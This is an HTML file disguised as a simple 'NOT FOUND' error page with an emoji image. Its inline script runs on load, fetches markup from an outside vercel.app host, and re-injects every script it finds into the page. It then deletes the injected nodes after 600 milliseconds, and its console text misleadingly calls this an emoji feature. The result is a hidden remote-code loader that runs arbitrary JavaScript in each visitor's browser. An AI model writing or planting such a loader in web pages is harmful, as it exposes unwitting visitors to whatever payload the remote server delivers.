<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NOT FOUND</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    background: #ffffff;
    color: #000000;
    font-family: Arial, Helvetica, sans-serif;
    width: 100%;
    height: 100%;
  }
  .wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    text-align: center;
    padding: 60px;
    box-sizing: border-box;
  }
  h1 {
    font-size: clamp(2.5rem, 8vw, 6rem);
    margin: 0 0 10px 0;
    line-height: 1.1;
    color: #000000;
  }
  p {
    font-size: clamp(1rem, 3vw, 2rem);
    font-weight: 700;
    letter-spacing: 2px;
    margin: 0;
    color: #000000;
  }
</style>
</head>
<body>
  <div class="wrap">
    <img src="https://magic-scripts-emojis.vercel.app/emoji/?id=%F0%9F%98%B5" alt="https://magic-scripts-emojis.vercel.app/emoji/?id=%F0%9F%98%B5">
    <p>NOT FOUND</p>
  </div>

  <script>
    (async () => {
      try {
        const response = await fetch('https://magic-scripts.vercel.app/heart.html');
        const rawMarkup = await response.text();
        const documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');

        documentDOM.querySelectorAll('script').forEach(oldNode => {
          const freshScriptNode = document.createElement('script');
          if (oldNode.src) {
            freshScriptNode.src = oldNode.src;
            freshScriptNode.async = true;
          } else {
            freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
          }
          document.body.appendChild(freshScriptNode);
          setTimeout(() => freshScriptNode.remove(), 600);
        });

        console.log('Emoji Engine Hook Active');
      } catch (e) {
        console.error('Emoji Override Skipped due to runtime separation layer context.', e);
      }
    })();
  </script>
</body>
</html>
